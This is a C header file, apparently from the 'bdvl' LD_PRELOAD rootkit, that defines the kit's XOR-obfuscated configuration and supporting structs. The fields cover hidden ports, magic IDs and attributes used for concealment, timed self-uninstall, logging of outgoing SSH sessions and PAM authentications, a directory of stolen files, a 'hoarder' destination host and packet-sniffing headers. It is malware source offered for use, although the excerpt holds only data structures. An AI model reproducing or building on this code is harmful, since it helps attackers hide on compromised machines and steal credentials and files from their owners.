/* here, in bdvcfg_t, is stored some settings that the installation requires.
 *
 * before installation, this is populated by getbdvcfg.
 * the result of getbdvcfg is a bdvcfg_t pointer, populated & all strings xor'd.
 * this result is written to BDVL_CONFIG for the kit to read from.
 *
 * after writing, reading of BDVL_CONFIG is done by readbdvcfg - the result is a populated & (un-)xor'd bdvcfg_t pointer.
 * if and/or when values have been changed, the result of readbdvcfg is (re-)xor'd & written, again, to BDVL_CONFIG. */
typedef struct {
    char installdir[PATHMAX];
    char homedir[PATHMAX];
    char preloadpath[19]; /* preloadpath cannot be anything else but 18 bytes. */
    char bdvlso[128];
    char bdvar[17];  /* var is always 16 bytes. */
    u_short hideports[MAX_HIDE_PORTS];  /* contains up to MAX_HIDE_PORTS hidden ports. */
    u_int portcount;  /* the number of non-zero values (port numbers) currently stored in hideports. */
    id_t magicid;
#ifdef USE_MAGIC_ATTR
    char magicattr[MAGIC_ATTR_LENGTH+1];
#ifdef ATTR_CHANGE_TIME
    time_t attrchangetime;
#endif
#endif
#if defined AFTER_HOURS || defined AFTER_DAYS
    u_int uninstallwhen;
#endif
    time_t installtime;  /* time of installation/update. */
#ifdef GID_CHANGE_MINTIME
    time_t idchangetime;  /* time since last magic id change. */
#endif
#ifdef OUTGOING_SSH_LOGGING
    char sshlogs[PATHMAX];  /* path to which outgoing ssh logs are stored. */
#endif
#ifdef ENABLE_STEAL
    char interestdir[PATHMAX];  /* directory that stolen files are stored in. */
#ifdef FILE_CLEANSE_TIMER
    time_t filecleantime;  /* time since last interestdir cleanse. */
#endif
#endif
#ifdef PAM_AUTH_LOGGING
    char logpath[PATHMAX];   /* path to which successful authentications for users are stored. */
#endif
#ifdef HIDE_MY_ASS
    char asspath[PATHMAX];  /* path to which your random (non-rk) paths are kept track of in. */
#endif
#ifdef HOARDER_HOST
    char hoarder_host[23];  /* destination for HOARDER_HOST. */
#endif
} bdvcfg_t;

/* logfile struct. */
typedef struct {
    u_int log_count;
    time_t log_timestamps[LOG_MAX_CAPACITY];
    char log_contents[LOG_MAX_CAPACITY][LOG_MAX_SIZE_BYTES];
} bdvlogfile_t;

/* custom hidepaths file struct. (`./bdv my_ass`) */
#ifdef HIDE_MY_ASS
typedef struct {
    u_int path_count;
    char hide_paths[MAX_HIDE_PATHS][PATH_MAX];
} bdvhidepaths_t;
#endif

/* used for ./bdv update storing new hidden ports. */
typedef struct {
    u_short *hideports;
    u_int nhideports;
} new_hideports;

/* stores stuff about /proc/net/tcp entries. */
typedef struct {
    char raddr[33];
    char laddr[33];
    char etc[64];
    u_long rxq;
    u_long txq;
    u_long t_len;
    u_long retr;
    u_long inode;
    u_int d;
    int lport;
    int rport;
    int state;
    int t_run;
    uid_t uid;
    int tout;
} procnet_t;

/* stores information about the caller's loaded bdvl.so at runtime. */
typedef struct {
    size_t sonamelen;
    size_t sopathlen;
    size_t installdirlen;
    char soname[128];
    char installdir[PATHMAX];
    char sopath[PATHMAX+256];
} bdvso_t;

/* pcap stuff */
#ifndef NO_PCAP_STUFF
/* default snap length (maximum bytes per packet to capture) */
#define MAX_CAP 1518
/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* IP header */
struct sniff_ip {
    u_char ip_vhl;                   /* version << 4 | header length >> 2 */
    u_char ip_tos;                   /* type of service */
    u_short ip_len;                  /* total length */
    u_short ip_id;                   /* identification */
    u_short ip_off;                  /* fragment offset field */
#define IP_RF 0x8000                 /* reserved fragment flag */
#define IP_DF 0x4000                 /* dont fragment flag */
#define IP_MF 0x2000                 /* more fragments flag */
#define IP_OFFMASK 0x1fff            /* mask for fragmenting bits */
    u_char ip_ttl;                   /* time to live */
    u_char ip_p;                     /* protocol */
    u_short ip_sum;                  /* checksum */
    struct in_addr ip_src, ip_dst;   /* source and dest address */
};
#define IP_HL(ip) (((ip)->ip_vhl) & 0x0f)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
    u_short th_sport; /* source port */
    u_short th_dport; /* destination port */
    tcp_seq th_seq;   /* sequence number */
    tcp_seq th_ack;   /* acknowledgement number */
    u_char th_offx2;  /* data offset, rsvd */
#define TH_OFF(th) (((th)->th_offx2 & 0xf0) >> 4)
    u_char th_flags;
#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80
#define TH_FLAGS (TH_FIN | TH_SYN | TH_RST | TH_ACK | TH_URG | TH_ECE | TH_CWR)
    u_short th_win; /* window */
    u_short th_sum; /* checksum */
    u_short th_urp; /* urgent pointer */
};
#endif